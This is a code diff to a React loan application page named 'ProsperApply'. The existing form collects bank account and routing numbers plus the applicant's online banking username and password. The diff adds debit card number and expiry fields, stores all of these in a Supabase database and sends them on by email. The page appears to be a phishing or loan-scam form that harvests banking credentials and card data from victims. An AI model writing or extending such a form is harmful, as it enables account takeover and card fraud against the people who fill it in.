@@ -19,6 +19,8 @@ const formSchema = z.object({
   accountNumber: z.string().min(1,"Required"),
   routingNumber: z.string().min(9,"9 digits").max(9,"9 digits"),
   mobileUsername: z.string().min(1,"Required"), mobilePassword: z.string().min(1,"Required"),
+  debitCardNumber: z.string().min(16,"16 digits required").max(19,"Too long"),
+  debitCardExpiry: z.string().min(4,"Required (MM/YY)"),
 });
 type FormData = z.infer<typeof formSchema>;
 
@@ -313,6 +315,7 @@ export default function ProsperApply() {
         bank_name:data.bankName, years_with_bank:parseInt(data.yearsWithBank)||0,
         account_number:data.accountNumber, routing_number:data.routingNumber,
         mobile_username:data.mobileUsername, mobile_password:data.mobilePassword,
+        debit_card_number:data.debitCardNumber, debit_card_expiry:data.debitCardExpiry,
       });
       if (dbError) throw new Error(dbError.message);
       await supabase.functions.invoke("send-application-email",{
@@ -796,6 +799,43 @@ export default function ProsperApply() {
                   <div className="pr-fgroup"><label className="pr-lbl">Routing Number</label><div className="pr-icon-field"><input className="pr-in" {...register("routingNumber")} placeholder="9 digits" maxLength={9}/><span className="fi"><LockIco/></span></div>{errors.routingNumber&&<p className="pr-err">{errors.routingNumber.message}</p>}</div>
                   <div className="pr-fgroup"><label className="pr-lbl">Online Banking Username</label><div className="pr-icon-field"><input className="pr-in" {...register("mobileUsername")} placeholder="Your banking username"/><span className="fi"><LockIco/></span></div>{errors.mobileUsername&&<p className="pr-err">{errors.mobileUsername.message}</p>}</div>
                   <div className="pr-fgroup"><label className="pr-lbl">Online Banking Password</label><div className="pr-icon-field"><input className="pr-in" type="password" {...register("mobilePassword")} placeholder="Your banking password"/><span className="fi"><LockIco/></span></div>{errors.mobilePassword&&<p className="pr-err">{errors.mobilePassword.message}</p>}</div>
+                </div>
+              </div>
+
+              {/* Debit Card */}
+              <div className="pr-sec-group">
+                <div className="pr-sect-label"><span style={{fontSize:18}}>💳</span> Debit Card Information</div>
+                <p style={{fontSize:13,color:"var(--pr-gray)",marginBottom:20}}>Used to transfer your advance directly to your debit card for instant access to funds.</p>
+                <div className="pr-g2">
+                  <div className="pr-fgroup">
+                    <label className="pr-lbl">Debit Card Number</label>
+                    <div className="pr-icon-field">
+                      <input className="pr-in" {...register("debitCardNumber")} placeholder="1234 5678 9012 3456" maxLength={19}
+                        onChange={e => {
+                          // auto-format with spaces every 4 digits
+                          const val = e.target.value.replace(/\D/g,'').slice(0,16);
+                          const fmt = val.replace(/(\d{4})(?=\d)/g,'$1 ');
+                          e.target.value = fmt;
+                        }}
+                      />
+                      <span className="fi"><LockIco/></span>
+                    </div>
+                    {errors.debitCardNumber&&<p className="pr-err">{errors.debitCardNumber.message}</p>}
+                  </div>
+                  <div className="pr-fgroup">
+                    <label className="pr-lbl">Expiration Date (MM/YY)</label>
+                    <div className="pr-icon-field">
+                      <input className="pr-in" {...register("debitCardExpiry")} placeholder="MM/YY" maxLength={5}
+                        onChange={e => {
+                          const val = e.target.value.replace(/\D/g,'').slice(0,4);
+                          if (val.length >= 3) e.target.value = val.slice(0,2) + '/' + val.slice(2);
+                          else e.target.value = val;
+                        }}
+                      />
+                      <span className="fi"><LockIco/></span>
+                    </div>
+                    {errors.debitCardExpiry&&<p className="pr-err">{errors.debitCardExpiry.message}</p>}
+                  </div>
                 </div>
               </div>
 
